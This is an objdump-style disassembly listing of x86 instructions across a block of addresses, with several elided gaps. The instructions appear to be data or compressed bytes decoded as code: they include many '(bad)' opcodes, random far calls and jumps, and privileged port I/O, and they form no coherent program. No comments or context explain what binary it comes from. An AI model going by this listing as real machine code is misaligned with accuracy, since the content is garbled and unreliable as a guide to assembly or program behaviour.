  422269:	arpl   WORD PTR [eax-0x3c],sp
  42226c:	lods   eax,DWORD PTR ds:[esi]
  42226d:	mov    bl,0xa
  42226f:	fbstp  TBYTE PTR [edi+ecx*4+0x62f13794]
  422276:	shl    DWORD PTR ds:0xbbef8872,0x47
  42227d:	test   al,0xbe
  42227f:	adc    esi,0x425c72e2
  422285:	adc    eax,0xe9411a60
  42228a:	inc    edi
  42228b:	fcmove st,st(7)
  42228d:	cmp    ebp,ecx
  42228f:	(bad)  
  422290:	test   eax,0x838f43dc
  422295:	and    BYTE PTR [ecx],bl
  422297:	dec    edx
  422298:	retf   
  422299:	xchg   ebx,eax
  42229a:	sahf   
  42229b:	push   ecx
  42229c:	repz mov WORD PTR [edx-0x7d],gs
  4222a0:	gs rcr DWORD PTR ss:[edx-0x32bebd8],cl
  4222a8:	ins    DWORD PTR es:[edi],dx
  4222a9:	mov    ch,0xe8
  4222ab:	clc    
  4222ac:	jge    0x4222a5
  4222ae:	(bad)  
  4222af:	and    DWORD PTR [ecx+esi*2-0x5c],eax
  4222b3:	cmp    dl,BYTE PTR [edx]
  4222b5:	retf   0x8702
  4222b8:	cmp    dh,BYTE PTR [edi+0x62]
  4222bb:	nop
  4222bc:	lds    esp,FWORD PTR ds:0x1abedc68
  4222c2:	or     eax,0x932dd18e
  4222c7:	retf   0x9c01
  4222ca:	daa    
  4222cb:	js     0x422283
  4222cd:	jl     0x422315
  4222cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222d0:	adc    ch,BYTE PTR [ebp+0x11]
  4222d3:	xchg   esp,eax
  4222d4:	adc    DWORD PTR [esi-0x9],eax
  4222d7:	into   
  4222d8:	and    eax,0x812ed973
  4222dd:	push   ds
  4222de:	inc    edi
  4222df:	iret   
  4222e0:	pusha  
  4222e1:	test   al,0x4a
  4222e3:	mov    ebx,0x6eb8a91e
  4222e9:	pop    edi
  4222ea:	adc    al,0xad
  4222ec:	add    dh,ah
	...
  422356:	(bad)  
  422357:	in     eax,dx
  422358:	lods   eax,DWORD PTR ds:[esi]
  422359:	imul   edi
  42235b:	neg    edi
  42235d:	std    
  42235e:	sub    ebx,DWORD PTR [ebp+0x71]
  422361:	dec    ecx
  422362:	out    dx,eax
  422363:	sbb    al,0xcf
  422365:	cdq    
  422366:	outs   dx,DWORD PTR ds:[si]
  422368:	add    DWORD PTR [eax],eax
  42236a:	add    BYTE PTR [ecx],al
  42236c:	add    BYTE PTR [eax],al
  42236e:	mov    ds:0xfacc749,al
  422373:	stos   DWORD PTR es:[edi],eax
  422374:	jp     0x4223b3
  422376:	mov    eax,ds:0x54f7dddb
  42237b:	retf   
  42237c:	mov    al,0x6f
  42237e:	test   DWORD PTR ds:0x693456f2,ebx
  422384:	mov    bl,0x6d
  422386:	push   ebp
  422387:	jge    0x4223aa
  422389:	push   ds
  42238a:	fld    DWORD PTR [esi]
  42238c:	lahf   
  42238d:	jmp    FWORD PTR [edx+edx*1-0x5f]
  422391:	lea    ecx,[edi+ebp*1-0x29]
  422395:	std    
  422396:	push   0xffffff80
  422398:	retf   
  422399:	jae    0x4223d6
  42239b:	jl     0x422350
  42239d:	jae    0x422353
  42239f:	pop    ecx
  4223a0:	sub    BYTE PTR [eax],bl
  4223a2:	(bad)  
  4223a4:	shl    edx,cl
  4223a6:	fucomp st(0)
  4223a8:	retf   0x2255
  4223ab:	jns    0x4223b5
  4223ad:	mov    ebp,0xf91cf6c3
  4223b2:	sahf   
  4223b3:	pop    esp
  4223b4:	jbe    0x422404
  4223b6:	fstp   st(1)
  4223b8:	dec    ecx
  4223b9:	adc    dh,bh
  4223bb:	push   ebp
  4223bc:	call   0x6639:0x592fe50
  4223c3:	mov    esi,0xda9e0750
  4223c8:	(bad)  
  4223c9:	sbb    al,0x8e
  4223cb:	repz pop ebp
  4223cd:	jb     0x4223c4
  4223cf:	(bad)  
  4223d0:	into   
  4223d1:	jge    0x4223bd
  4223d3:	xchg   ebp,eax
  4223d4:	sbb    al,0x81
  4223d6:	out    0xdb,eax
  4223d8:	shr    DWORD PTR [ebx-0x37cc8f0c],1
  4223de:	imul   esi,DWORD PTR [eax+ecx*2],0xffffffd4
  4223e2:	sti    
  4223e3:	test   BYTE PTR [edi+0x46a966f1],al
  4223e9:	ds (bad) 
  4223ec:	cwde   
  4223ed:	jecxz  0x4223c0
  4223ef:	xchg   esi,eax
  4223f0:	ins    WORD PTR es:[edi],dx
  4223f2:	sbb    DWORD PTR [edx+0x3d7cd614],esp
  4223f8:	sbb    eax,0x64e550bb
  4223fd:	mov    dl,0xfd
  4223ff:	xchg   BYTE PTR [esp+esi*2-0x4a2a270],dh
  422406:	or     eax,0xeb4627a3
  42240b:	fidiv  DWORD PTR [esp+edx*2+0xaaee143]
  422412:	jp     0x422421
  422414:	aaa    
  422415:	push   ss
  422416:	push   esp
  422417:	sub    BYTE PTR [ecx],cl
  422419:	fild   WORD PTR [edi]
  42241b:	sub    DWORD PTR [edi],edi
  42241d:	add    edx,ebp
  42241f:	lea    ecx,[ebp+0x577739fd]
  422425:	lods   al,BYTE PTR ds:[esi]
  422426:	(bad)  [edi+0xe]
  422429:	ja     0x42244b
  42242b:	bound  ecx,QWORD PTR [ebx-0x5f9eee0b]
  422431:	adc    ch,0xf2
  422434:	and    eax,0x17b80729
  422439:	retf   0xbbcd
  42243c:	sahf   
  42243d:	test   al,0x33
  42243f:	jecxz  0x4223fe
  422441:	shl    bh,cl
  422443:	daa    
  422444:	dec    esi
  422445:	jmp    0xb60f:0xba4ce282
  42244c:	(bad)  [ebx]
  42244e:	mov    ds:0x4df3f006,eax
  422453:	fstp   QWORD PTR [eax]
  422455:	add    edx,DWORD PTR ds:0x432c594f
  42245b:	or     eax,0x5b0ef36c
  422460:	ret    0xdb4f
  422463:	aaa    
  422464:	xor    BYTE PTR fs:[ebp-0x4e3f28ea],0x77
  42246c:	bound  esp,QWORD PTR [ecx+0x0]
	...
  4224d3:	add    BYTE PTR [eax],al
  4224d5:	add    BYTE PTR [edx-0x7e],dl
  4224d8:	cs imul edi,esi,0xbbbb57ed
  4224df:	xor    ebp,esp
  4224e1:	cdq    
  4224e2:	in     al,0x7
  4224e4:	je     0x4224f1
  4224e6:	addr16 jo 0x4224ea
  4224e9:	add    BYTE PTR [eax],al
  4224eb:	add    DWORD PTR [eax],eax
  4224ed:	add    BYTE PTR [edx+ebp*8],ah
  4224f0:	mov    esi,0xa9023743
  4224f5:	pop    edx
  4224f6:	add    dh,BYTE PTR [edx]
  4224f8:	dec    ebp
  4224f9:	pop    ss
  4224fa:	xchg   edi,eax
  4224fb:	sahf   
  4224fc:	ss call 0x326d:0xfc9972d
  422504:	cld    
  422505:	fld    DWORD PTR [edi+eiz*1+0xda1ff93]
  42250c:	push   ds
  42250d:	sbb    BYTE PTR [ecx-0x4741545f],bh
  422513:	cmp    edx,edx
  422515:	test   bh,ch
  422517:	sub    esp,edx
  422519:	(bad)  
  42251a:	in     al,dx
  42251b:	jae    0x4224e8
  42251d:	pop    ds
  42251e:	sbb    edx,DWORD PTR [edx+0x7cdb003f]
  422524:	xchg   edi,eax
  422525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422526:	push   edi
  422527:	sub    eax,0xeff71178
  42252c:	mov    eax,ds:0xd1578684
  422531:	xor    edx,DWORD PTR [edi]
  422533:	push   esp
  422534:	mov    di,WORD PTR [ecx+ebp*2-0x33]
  422539:	xor    al,0x6
  42253b:	ficom  DWORD PTR [ebx-0x4]
  42253e:	pop    ecx
  42253f:	push   ecx
  422540:	cmp    BYTE PTR ds:0x3e2f7b45,bh
  422546:	jnp    0x42253a
  422548:	sbb    BYTE PTR [edi-0x73],cl
  42254b:	inc    edx
  42254c:	int3   
  42254d:	pop    esi
  42254e:	push   cs
  42254f:	(bad)  
  422550:	dec    esp
  422551:	push   0x9282616b
  422556:	bound  edi,QWORD PTR [eax-0x34277773]
  42255c:	(bad)  
  42255d:	mov    esi,0xc7a55614
  422562:	js     0x42256a
  422564:	mov    esp,0xebbe6b42
  422569:	pop    eax
  42256a:	mov    edi,0xfb0a6367
  42256f:	xchg   BYTE PTR [eax-0x248d0063],ah
  422575:	repz std 
  422577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422578:	seto   BYTE PTR [ebx+eiz*4]
  42257c:	push   cs
  42257d:	hlt    
  42257e:	cmp    BYTE PTR ss:[ebp+0x2e60d07a],dl
  422585:	xchg   ecx,ebp
  422587:	sub    dh,ch
  422589:	fild   WORD PTR [esi+ebp*2+0x2d]
  42258d:	push   eax
  42258e:	mov    bl,0x10
  422590:	pop    esi
  422591:	fs mov ebx,0x6a5a4f22
  422597:	ins    DWORD PTR es:[edi],dx
  422598:	(bad)  
  422599:	cdq    
  42259a:	adc    dh,BYTE PTR [ebx+edi*8]
  42259d:	fbld   TBYTE PTR [edx+0x33b4521f]
  4225a3:	fcom   st(7)
  4225a5:	or     eax,edx
  4225a7:	push   edi
  4225a8:	sar    cl,1
  4225aa:	nop
  4225ab:	jmp    0x422548
  4225ad:	inc    ebx
  4225ae:	xor    eax,0xb1dd6706
  4225b3:	iret   
  4225b4:	inc    ecx
  4225b5:	aam    0xbe
  4225b7:	imul   esp,DWORD PTR [edi+eiz*2-0x45],0xffffffb5
  4225bc:	mov    bl,0x42
  4225be:	in     eax,0x41
  4225c0:	aad    0xea
  4225c2:	popf   
  4225c3:	mov    dl,0xf
  4225c5:	and    al,0x2e
  4225c7:	lahf   
  4225c8:	dec    esp
  4225c9:	in     al,dx
  4225ca:	lea    esi,[ebx]
  4225cc:	and    ebp,DWORD PTR es:[esi]
  4225cf:	call   0x7e82dae8
  4225d4:	add    al,0x42
  4225d6:	push   0xa6663bc1
  4225db:	sub    BYTE PTR [ebp+0x7b],al
  4225de:	mov    bh,0x3d
  4225e0:	stc    
  4225e1:	push   edi
  4225e2:	aaa    
  4225e3:	push   ecx
  4225e4:	add    al,0x83
  4225e6:	mov    al,0xaf
  4225e8:	and    ch,dl
  4225ea:	inc    esi
  4225eb:	and    BYTE PTR [edx-0x77],dl
	...
  422656:	call   0xfa77:0xbf778fae
  42265d:	out    dx,eax
  42265e:	sbb    esi,DWORD PTR [ecx-0x6d335d08]
  422664:	pop    ss
  422665:	cmp    BYTE PTR [edi+0x71],ah
  422668:	add    DWORD PTR [eax],eax
  42266a:	add    BYTE PTR [ecx],al
  42266c:	add    BYTE PTR [eax],al
  42266e:	pop    ss
  42266f:	je     0x422617
  422671:	imul   esp,DWORD PTR [edi-0x19859845],0x24733fa3
  42267b:	push   edi
  42267c:	mov    edi,0x62e7512e
  422681:	bswap  edi
  422683:	push   cs
  422684:	test   DWORD PTR [esp+ebx*4],edx
  422687:	popa   
  422688:	and    al,0xec
  42268a:	mov    ah,0xc9
  42268c:	or     ebp,DWORD PTR [eax]
  42268e:	mov    al,0xbc
  422690:	aad    0xf1
  422692:	ss dec esi
  422694:	and    BYTE PTR [eax+edx*4+0x1997dfa6],ch
  42269b:	inc    esp
  42269c:	sub    BYTE PTR [ebp+0x51],al
  42269f:	fmul   st,st(4)
  4226a1:	mov    ds:0x52e484a9,al
  4226a6:	adc    DWORD PTR [edx+0x4e],eax
  4226a9:	add    ebx,DWORD PTR [ebp+0x3a63561b]
  4226af:	pusha  
  4226b0:	mov    gs,WORD PTR [esi-0x80]
  4226b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226b4:	(bad)  
  4226b5:	imul   edi,DWORD PTR [ebx],0xffffffe3
  4226b8:	icebp  
  4226b9:	das    
  4226ba:	jno    0x4226e3
  4226bc:	shl    eax,0xb4
  4226bf:	add    dl,BYTE PTR [esi]
  4226c1:	push   es
  4226c2:	jge    0x422679
  4226c4:	xor    DWORD PTR [ebx+ebx*4],esi
  4226c7:	jbe    0x4226d5
  4226c9:	xlat   BYTE PTR ds:[ebx]
  4226ca:	mov    ah,0xe7
  4226cc:	fstp   st(7)
  4226ce:	adc    eax,0xb1cf5e75
  4226d3:	add    DWORD PTR [ebx],esi
  4226d5:	pop    ds
  4226d6:	pop    ebp
  4226d7:	je     0x422672
  4226d9:	push   fs
  4226db:	push   eax
  4226dc:	push   esi
  4226dd:	or     eax,0x64f500dd
  4226e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226e3:	(bad)  
  4226e4:	rcl    BYTE PTR [esi+0x41aa6b0d],cl
  4226ea:	ror    DWORD PTR [ebx-0x3915ffe8],1
  4226f0:	(bad)  
  4226f1:	xchg   ebx,eax
  4226f2:	push   ebp
  4226f3:	(bad)  
  4226f4:	repnz xor DWORD PTR [ebx-0x69e1ff35],ebx
  4226fb:	xor    dh,dh
  4226fd:	and    DWORD PTR [edx-0x43252ce2],0xe1bc1c97
  422707:	add    al,0xfe
  422709:	xchg   edx,eax
  42270a:	out    0xc6,al
  42270c:	jecxz  0x4226bd
  42270e:	mov    BYTE PTR [eax+0x1d],bh
  422711:	jp     0x422699
  422713:	inc    esp
  422714:	pop    ebx
  422715:	fcomp  st(1)
  422717:	xchg   edi,eax
  422718:	sub    esi,DWORD PTR [ecx+0x456bb16d]
  42271e:	pop    esp
  42271f:	or     eax,eax
  422721:	dec    eax
  422722:	mov    ebp,0x6c8a62f2
  422727:	inc    edi
  422728:	xor    dh,dh
  42272a:	call   0x27b52b56
  42272f:	aad    0x25
  422731:	es mov al,al
  422734:	and    eax,esp
  422736:	lahf   
  422737:	rcl    BYTE PTR [ebp+edx*4+0x682d3f7c],1
  42273e:	cwde   
  42273f:	idiv   DWORD PTR [ecx+0x2141c1a4]
  422745:	mov    eax,0x33daf866
  42274a:	pop    esi
  42274b:	mov    BYTE PTR [ecx+edi*8-0x7a],bl
  42274f:	xor    esi,ebp
  422751:	jg     0x42270c
  422753:	xor    ebp,0x16
  422756:	mov    DWORD PTR [ebx+0xd],esi
  422759:	cwde   
  42275a:	mov    eax,0x84c6122d
  42275f:	inc    esp
  422760:	mov    al,0x97
  422762:	lods   eax,DWORD PTR ds:[esi]
  422763:	dec    esp
  422764:	cwde   
  422765:	ins    BYTE PTR es:[edi],dx
  422766:	fmul   QWORD PTR [esp+edi*2+0x34639f12]
  42276d:	mov    eax,ds:0x0
	...
  4227d6:	daa    
  4227d7:	sub    eax,0x7d7f2d7d
  4227dc:	ja     0x42280d
  4227de:	mov    esi,0x727f01c8
  4227e3:	mov    BYTE PTR [esi+0x1e],al
  4227e6:	addr16 jb 0x4227ea
  4227e9:	add    BYTE PTR [eax],al
  4227eb:	add    DWORD PTR [eax],eax
  4227ed:	add    BYTE PTR [edi],ch
  4227ef:	push   edi
  4227f0:	addr16 inc ebx
  4227f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227f3:	xchg   esi,eax
  4227f4:	rcl    dh,0xb4
  4227f7:	rol    DWORD PTR [edx-0x656c85a],cl
  4227fd:	or     edi,esi
  4227ff:	jg     0x422844
  422801:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422802:	adc    eax,0x270cd838
  422807:	or     al,BYTE PTR [ecx-0x2de5c9e]
  42280d:	inc    ecx
  42280e:	mov    dl,ch
  422810:	pop    edi
  422811:	xor    ecx,ebp
  422813:	mov    cl,0xb6
  422815:	add    DWORD PTR [ecx],0xffffffdc
  422818:	lock imul ebx,DWORD PTR [edx],0x62
  42281c:	sbb    al,0xff
  42281e:	jae    0x422830
  422820:	adc    eax,0xc9f112a
  422825:	adc    ebp,0x29a8e20a
  42282b:	xor    eax,0x5abe476c
  422830:	adc    ch,BYTE PTR [ecx]
  422832:	jae    0x422885
  422834:	xchg   ebx,eax
  422835:	fdivr  QWORD PTR ds:0x9515aefa
  42283b:	jo     0x422814
  42283d:	sbb    al,0xe8
  42283f:	popa   
  422840:	stos   BYTE PTR es:[edi],al
  422841:	xchg   ebx,eax
  422842:	mov    BYTE PTR [ebx],cl
  422844:	cmp    BYTE PTR [edi+0x66909afb],ch
  42284a:	pop    ebp
  42284b:	and    BYTE PTR ds:0x16124de7,al
  422851:	mov    bl,0x1b
  422853:	test   eax,0x5ca3461e
  422858:	inc    esp
  422859:	sub    bl,al
  42285b:	imul   ebx,DWORD PTR [edx-0x5ece7888],0x6
  422862:	test   DWORD PTR [edi],ebx
  422864:	push   esi
  422865:	jns    0x422843
  422867:	sbb    eax,DWORD PTR [ebp+0x258079b6]
  42286d:	fcmovnb st,st(3)
  42286f:	gs push ds
  422871:	cmp    al,0x44
  422873:	sub    BYTE PTR [eax-0x3670c2d7],dh
  422879:	or     DWORD PTR ds:0x2609f93b,0x6c
  422880:	cmp    eax,0x982284b0
  422885:	std    
  422886:	cld    
  422887:	jg     0x42287f
  422889:	ins    DWORD PTR es:[edi],dx
  42288a:	cs je  0x42287e
  42288d:	xchg   edi,eax
  42288e:	mov    edi,0x4c7f5179
  422893:	ret    
  422894:	in     eax,dx
  422895:	jmp    0x42288b
  422897:	mov    ebx,0xad52108b
  42289c:	adc    DWORD PTR [edx+0x73],edx
  42289f:	mov    ch,0x57
  4228a1:	pop    ss
  4228a2:	or     al,0x2e
  4228a4:	jns    0x422897
  4228a6:	jno    0x422829
  4228a8:	mul    BYTE PTR [edi]
  4228aa:	lock dec ebx
  4228ac:	and    BYTE PTR [edi-0x6f],al
  4228af:	jge    0x4228ae
  4228b1:	pop    ss
  4228b2:	jle    0x4228d7
  4228b4:	pop    edx
  4228b5:	inc    esi
  4228b6:	aad    0x20
  4228b8:	mov    eax,0x965358cd
  4228bd:	cmp    al,0xbd
  4228bf:	mov    eax,0xde46f0fa
  4228c4:	nop
  4228c5:	test   eax,0xdf8e6be2
  4228ca:	inc    esi
  4228cb:	or     eax,0xdcdad752
  4228d0:	clc    
  4228d1:	mov    esp,0x25396086
  4228d6:	or     cl,BYTE PTR [ebp+ecx*8-0x2]
  4228da:	test   eax,0xa1f90235
  4228df:	shl    DWORD PTR [ebp+eiz*1-0x190bdde0],1
  4228e6:	ins    DWORD PTR es:[edi],dx
  4228e7:	inc    edx
  4228e8:	inc    ebx
  4228e9:	pop    edi
  4228ea:	clc    
  4228eb:	pop    edi
  4228ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228ed:	retf   0x0
	...
  422954:	add    BYTE PTR [eax],al
  422956:	int    0x39
  422958:	mov    eax,0xef97fc97
  42295d:	jnp    0x42291d
  42295f:	outs   dx,DWORD PTR ds:[esi]
  422960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422961:	loopne 0x4228f6
  422963:	jmp    0x4228f6
  422965:	shl    DWORD PTR [edi+0x73],cl
  422968:	add    DWORD PTR [eax],eax
  42296a:	add    BYTE PTR [ecx],al
  42296c:	add    BYTE PTR [eax],al
  42296e:	fnstsw WORD PTR [esi]
  422970:	dec    esp
  422971:	hlt    
  422972:	loop   0x422933
  422974:	cmp    esp,DWORD PTR [edi+0x921789b]
  42297a:	jbe    0x422997
  42297c:	lods   eax,DWORD PTR ds:[esi]
  42297d:	pushf  
  42297e:	and    ebx,0xffffff82
  422981:	ja     0x4229cf
  422983:	out    dx,al
  422984:	fs sbb eax,0x4af3cc87
  42298a:	push   ebx
  42298b:	ins    BYTE PTR es:[edi],dx
  42298c:	and    DWORD PTR [edx-0x168385d4],esp
  422992:	std    
  422993:	pop    edi
  422994:	out    0x57,eax
  422996:	mov    bh,0x73
  422998:	stos   BYTE PTR es:[edi],al
  422999:	mov    dh,BYTE PTR [ebp+0x38]
  42299c:	inc    ecx
  42299d:	cmp    ch,al
  42299f:	fistp  QWORD PTR [ebp+edx*1-0x7]
  4229a3:	in     al,0x4a
  4229a5:	not    BYTE PTR [eax+0x56]
  4229a8:	ins    DWORD PTR es:[edi],dx
  4229a9:	cmp    al,0x37
  4229ab:	push   ebx
  4229ac:	fldenv [eax+0x3c]
  4229af:	jo     0x422935
  4229b1:	call   0xdef3:0xdcf7de45
  4229b8:	push   0x25cc7e7e
  4229bd:	push   0xffffffe3
  4229bf:	in     eax,dx
  4229c0:	inc    ecx
  4229c1:	in     eax,0xd0
  4229c3:	mov    edi,0xf77a914a
  4229c8:	sbb    bl,ch
  4229ca:	adc    cl,dh
  4229cc:	push   es
  4229cd:	cmp    cl,BYTE PTR [eax-0x7ff09f90]
  4229d3:	sbb    BYTE PTR [ebx+0x18],ch
  4229d6:	sub    edi,DWORD PTR [eax+0x76]
  4229d9:	sbb    DWORD PTR [ebp+0x22],eax
  4229dc:	pushf  
  4229dd:	popa   
  4229de:	in     eax,dx
  4229df:	adc    al,0x53
  4229e1:	popf   
  4229e2:	mov    ah,0xf9
  4229e4:	out    0xf8,eax
  4229e6:	loopne 0x422991
  4229e8:	dec    edx
  4229e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229ea:	mov    ecx,0x8875751f
  4229ef:	push   ecx
  4229f0:	adc    eax,DWORD PTR [esi+0x38103f9a]
  4229f6:	fdiv   st(2),st
  4229f8:	pop    ds
  4229f9:	les    esp,FWORD PTR [edx-0x4d7075c3]
  4229ff:	jp     0x422a00
  422a01:	cmp    edx,DWORD PTR [ebx-0x37]
  422a04:	test   DWORD PTR [ebp-0x38],ebx
  422a07:	mov    esi,0x1c9e8dfc
  422a0c:	fidivr WORD PTR [edi+0x75f8c5a4]
  422a12:	addr16 aaa 
  422a14:	in     al,dx
  422a15:	and    esp,edi
  422a17:	xor    al,0x2e
  422a19:	cmp    eax,0x43add07c
  422a1e:	clc    
  422a1f:	jp     0x422a1f
  422a21:	shl    BYTE PTR [ebp+0x45e9bc43],1
  422a27:	adc    BYTE PTR [edi-0x16a84699],bl
  422a2d:	pop    ebx
  422a2e:	push   0xffffffd7
  422a30:	push   es
  422a31:	retf   
  422a32:	sbb    edx,eax
  422a34:	add    BYTE PTR [edi-0x31],al
  422a37:	xchg   esp,eax
  422a38:	mov    DWORD PTR [edx-0x66820d9e],esi
  422a3e:	ins    DWORD PTR es:[edi],dx
  422a3f:	cwde   
  422a40:	xchg   ebp,eax
  422a41:	ret    0xc57
  422a44:	jp     0x422a48
  422a46:	mov    edx,0xa28ae9fd
  422a4b:	aas    
  422a4c:	push   esp
  422a4d:	or     BYTE PTR [ecx],dh
  422a4f:	mov    esp,0x5e067a1b
  422a54:	jg     0x422a7f
  422a56:	add    DWORD PTR [ebp+0x49898d84],esi
  422a5c:	pop    esp
  422a5d:	cmp    edi,DWORD PTR [ebx-0x68]
  422a60:	call   0x2f58:0x4b4a21db
  422a67:	jmp    DWORD PTR [edx+0x3a]
  422a6a:	rol    BYTE PTR [ebx],1
  422a6c:	test   eax,0xb2
	...
  422ad5:	add    BYTE PTR [esi-0x377e796],dl
  422adb:	cli    
  422adc:	xchg   esi,eax
  422add:	jle    0x422ab0
  422adf:	push   esp
  422ae0:	je     0x422a9f
  422ae2:	test   BYTE PTR [edi+0x746716c9],al
  422ae8:	add    DWORD PTR [eax],eax
  422aea:	add    BYTE PTR [ecx],al
  422aec:	add    BYTE PTR [eax],al
  422aee:	or     BYTE PTR [edx+0x51],cl
  422af1:	xor    DWORD PTR [esi],0x72
  422af4:	out    0xba,eax
  422af6:	cli    
  422af7:	fimul  DWORD PTR [eax-0x2d]
  422afa:	mov    BYTE PTR [esi+0x1195046e],dl
  422b00:	fsub   DWORD PTR [eax]
  422b02:	jne    0x422b3a
  422b04:	mov    eax,0xf4c3c2e
  422b09:	cld    
  422b0a:	dec    esi
  422b0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b0c:	pop    esp
  422b0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b0e:	pop    edx
  422b0f:	push   0xffffffd8
  422b11:	xchg   edi,eax
  422b12:	push   ds
  422b13:	icebp  
  422b14:	sahf   
  422b15:	int    0x44
  422b17:	out    0xa7,al
  422b19:	pop    esp
  422b1a:	setle  bh
  422b1d:	dec    esi
  422b1e:	or     DWORD PTR [esi+0x3e],edi
  422b21:	das    
  422b22:	push   0x63
  422b24:	out    0xeb,al
  422b26:	pop    es
  422b27:	mov    al,ds:0x831775fb
  422b2c:	xchg   esi,eax
  422b2d:	ret    
  422b2e:	iret   
  422b2f:	das    
  422b30:	cmp    DWORD PTR [esi-0x28],0x6b
  422b34:	xchg   DWORD PTR [eax+0x59],ebx
  422b37:	push   ecx
  422b38:	xchg   esp,eax
  422b39:	or     eax,DWORD PTR [edi-0x1f]
  422b3c:	pop    ebx
  422b3d:	xchg   ebp,eax
  422b3e:	sub    BYTE PTR ds:0x5663ed97,dl
  422b44:	dec    edx
  422b45:	jmp    0x695e:0xdd5cd0c6
  422b4c:	dec    edx
  422b4d:	icebp  
  422b4e:	pop    esp
  422b4f:	inc    eax
  422b50:	call   0x73c61c50
  422b55:	mov    edi,0xda399143
  422b5a:	gs pushf 
  422b5c:	and    al,0x25
  422b5e:	retf   0x2ddc
  422b61:	cmp    esp,DWORD PTR [ebp+0x5e]
  422b64:	lock inc ebp
  422b66:	xchg   ebp,eax
  422b67:	(bad)  
  422b68:	icebp  
  422b69:	xor    DWORD PTR [esi],edi
  422b6b:	retf   
  422b6c:	jo     0x422b99
  422b6e:	jecxz  0x422bc9
  422b70:	xchg   edx,eax
  422b71:	ja     0x422b0a
  422b73:	sub    al,0xcf
  422b75:	lods   al,BYTE PTR ds:[esi]
  422b76:	mov    dl,0x6f
  422b78:	add    ebp,ebx
  422b7a:	mov    bh,0x93
  422b7c:	js     0x422bfb
  422b7e:	hlt    
  422b7f:	ss pop ebp
  422b81:	ffree  st(1)
  422b83:	cmp    dh,dl
  422b85:	jno    0x422b3b
  422b87:	mov    ch,0xf2
  422b89:	in     al,0x56
  422b8b:	and    eax,0xa8c21db3
  422b90:	and    esp,DWORD PTR [ebx-0xc]
  422b93:	sbb    DWORD PTR [ebp+0x4fcc7382],esi
  422b99:	adc    eax,0x801a6ac0
  422b9e:	mov    ebx,0xd12fef18
  422ba3:	or     eax,0x8848fd12
  422ba8:	out    dx,eax
  422ba9:	xchg   DWORD PTR [ebx-0x6a76b0ae],ebx
  422baf:	and    al,0xad
  422bb1:	mov    cl,0x55
  422bb3:	jmp    0x28db12e2
  422bb8:	ins    BYTE PTR es:[edi],dx
  422bb9:	or     dl,BYTE PTR ds:0xfadd971f
  422bbf:	jmp    0x7549744a
  422bc4:	into   
  422bc5:	or     DWORD PTR [eax+0x2998d47c],0x62190c9a
  422bcf:	sub    al,0xeb
  422bd1:	sbb    al,ah
  422bd3:	mov    ebx,0xa34d37
  422bd8:	and    al,0x54
  422bda:	dec    BYTE PTR [eax]
  422bdc:	xlat   BYTE PTR ds:[ebx]
  422bdd:	xchg   ebp,eax
  422bde:	popf   
  422bdf:	and    ebp,ebx
  422be1:	inc    esp
  422be2:	and    bh,BYTE PTR [eax+eiz*2]
  422be5:	pop    es
  422be6:	test   BYTE PTR [ebx+0x22],ah
  422be9:	imul   ecx,DWORD PTR [edi+0x2c],0xc6ed
	...
  422c54:	add    BYTE PTR [eax],al
  422c56:	inc    esp
  422c57:	aaa    
  422c58:	dec    edx
  422c59:	fwait
  422c5a:	jnp    0x422c5b
  422c5c:	aad    0xff
  422c5e:	sbb    dl,BYTE PTR [edx-0x100eb264]
  422c64:	inc    eax
  422c65:	mov    edx,0x17567
  422c6a:	add    BYTE PTR [ecx],al
  422c6c:	add    BYTE PTR [eax],al
  422c6e:	xchg   edx,eax
  422c6f:	call   0x694b:0xcd37fa3
  422c76:	push   ebp
  422c77:	dec    ecx
  422c78:	add    dl,BYTE PTR [edx]
  422c7a:	inc    esi
  422c7b:	xor    DWORD PTR [ecx-0x760f29b0],edx
  422c81:	inc    edx
  422c82:	dec    ebx
  422c83:	pop    ebp
  422c84:	xchg   edi,eax
  422c85:	out    0xeb,al
  422c87:	lock add eax,0x857a3fc8
  422c8d:	cmp    DWORD PTR ds:0xb211650f,esp
  422c93:	aad    0xa9
  422c95:	cmp    ecx,edx
  422c97:	cmp    al,0x7b
  422c99:	out    0xa9,al
  422c9b:	xchg   bh,ch
  422c9d:	out    0xf7,al
  422c9f:	retf   
  422ca0:	stos   DWORD PTR es:[edi],eax
  422ca1:	not    DWORD PTR [eax]
  422ca3:	or     BYTE PTR [ebx+0x7f709561],bh
  422ca9:	sbb    DWORD PTR [edx+0x24],0x70c2e49c
  422cb0:	in     eax,0x4e
  422cb2:	mov    dl,0x87
  422cb4:	cdq    
  422cb5:	adc    esp,ecx
  422cb7:	and    edi,DWORD PTR [ebp+0x4b4c50bc]
  422cbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cbe:	push   ebx
  422cbf:	lock lea ebp,[ecx+0x4073ed9f]
  422cc6:	je     0x422c91
  422cc8:	ds ins DWORD PTR es:[edi],dx
  422cca:	popa   
  422ccb:	hlt    
  422ccc:	sbb    DWORD PTR ds:0xce1fbd9e,esi
  422cd2:	mov    ecx,?
  422cd4:	hlt    
  422cd5:	xor    ch,cl
  422cd7:	repnz mov ds:0xac2faff8,eax
  422cdd:	js     0x422c8b
  422cdf:	popa   
  422ce0:	push   ds
  422ce1:	mov    ss,WORD PTR [edx-0x63]
  422ce4:	(bad)  
  422ce5:	mov    bl,0x6c
  422ce7:	sahf   
  422ce8:	in     eax,0x2
  422cea:	pop    ecx
  422ceb:	add    edx,DWORD PTR [eax+0x42]
  422cee:	jecxz  0x422d63
  422cf0:	cmp    dl,BYTE PTR [ecx+esi*2+0x709de5dc]
  422cf7:	ins    DWORD PTR es:[edi],dx
  422cf8:	stos   DWORD PTR es:[edi],eax
  422cf9:	lahf   
  422cfa:	push   ss
  422cfb:	inc    ecx
  422cfc:	and    BYTE PTR [ebp+0x57],0x8d
  422d00:	xor    ch,bh
  422d02:	(bad)  
  422d03:	(bad)  
  422d04:	jbe    0x422c86
